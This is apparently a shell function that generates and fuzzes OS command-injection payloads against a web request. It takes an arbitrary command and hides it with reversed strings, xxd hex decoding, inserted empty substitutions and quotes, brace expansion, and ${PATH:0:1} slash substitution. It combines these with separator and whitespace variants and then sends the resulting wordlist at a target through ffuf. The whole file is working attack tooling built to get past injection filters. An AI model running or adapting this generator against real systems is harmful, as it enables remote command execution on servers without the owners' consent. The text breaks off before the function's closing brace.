osscan(){
    rm ./os_injection.txt
    read -r cmd\?"INPUT COMMAND TO EXECUTE: "
    read -r regex\?"INPUT RESPONSE CONFIRMATION STRING (BLANK IF BLIND): "

    bin=$(echo "$cmd" | awk '{print $1}')
    echo "rev" | sed 's/./&$()/1' >> /tmp/rev_mangle.txt
    echo "rev" | sed 's/./&$@/1' >> /tmp/rev_mangle.txt
    echo "rev" | sed "s/./&\'\'/1" >> /tmp/rev_mangle.txt
    echo "rev" | sed "s/./&\"\"/1" >> /tmp/rev_mangle.txt

    while read rev; do
        revstr="$rev<<<'$(echo "$cmd" | rev)'"
        echo "\$($revstr)" >> ./payloads.txt
        echo "\`$revstr\`" >> ./payloads.txt
    done < /tmp/rev_mangle.txt
    rm /tmp/rev_mangle.txt

    echo "xxd" | sed 's/./&$()/1' >> /tmp/xxd_mangle.txt
    echo "xxd" | sed 's/./&$@/1' >> /tmp/xxd_mangle.txt
    echo "xxd" | sed "s/./&\'\'/1" >> /tmp/xxd_mangle.txt
    echo "xxd" | sed "s/./&\"\"/1" >> /tmp/xxd_mangle.txt
    echo "\$(rev<<<xxd)" >> /tmp/xxd_mangle.txt
    while read xxd; do
        echo "\$($xxd -r -ps<<<$(echo -n "$cmd" | hexdump -ve '/1 "%02x"'))" >> ./payloads.txt
        echo "\`$xxd -r -ps<<<$(echo -n "$cmd" | hexdump -ve '/1 "%02x"')\`" >> ./payloads.txt
        echo "{$xxd,-r,-ps,<<<,$(echo -n "$cmd" | hexdump -ve '/1 "%02x"')}" >> ./payloads.txt
    done < /tmp/xxd_mangle.txt
    rm /tmp/xxd_mangle.txt

    echo "$cmd" | sed 's/./&$()/1' >> /tmp/cmd_mangle.txt
    echo "$cmd" | sed 's/./&$@/1' >> /tmp/cmd_mangle.txt
    echo "$cmd" | sed "s/./&\'\'/1" >> /tmp/cmd_mangle.txt
    echo "$cmd" | sed "s/./&\"\"/1" >> /tmp/cmd_mangle.txt
    while read cmdp; do
        echo "$cmdp" >> ./payloads.txt
        echo "\$($cmdp)" >> ./payloads.txt
        echo "\`$cmdp\`" >> ./payloads.txt
        echo "{$(echo $cmdp | sed -e "s/ /,/g")}" >> ./payloads.txt
    done < /tmp/cmd_mangle.txt
    rm /tmp/cmd_mangle.txt

    while read sp; do
        cat ./payloads.txt | sed "s/ /$sp/g" >> ./payloads.txt
    done < ./spaces.txt
    cat ./payloads.txt | sed -e "s/\//\$\{PATH:0:1\}/g" >> ./payloads.txt

    while read sp; do
        while read sep; do
            while read payload; do
                echo "$sp$sep$sp$payload" >> os_injection.txt
                echo "$sp$sep$sp$payload$sp#" >> os_injection.txt
            done < ./payloads.txt
        done < ./separators.txt
    done < ./spaces.txt
    rm ./payloads.txt

    cat os_injection.txt | sort -u | shuf >t; mv t os_injection.txt
    if [[ ! -z $regex ]]; then
        echo -e "\nFUZZING REQUEST \"$1\" AND MATCHING RESPONSE FOR \"$regex\""
        ffuf -r -request $1 --request-proto http -w os_injection.txt -s -mr $regex
    else
        echo -e "\nFUZZING REQUEST \"$1\""
        ffuf -r -request $1 --request-proto http -w os_injection.txt -s
    fi
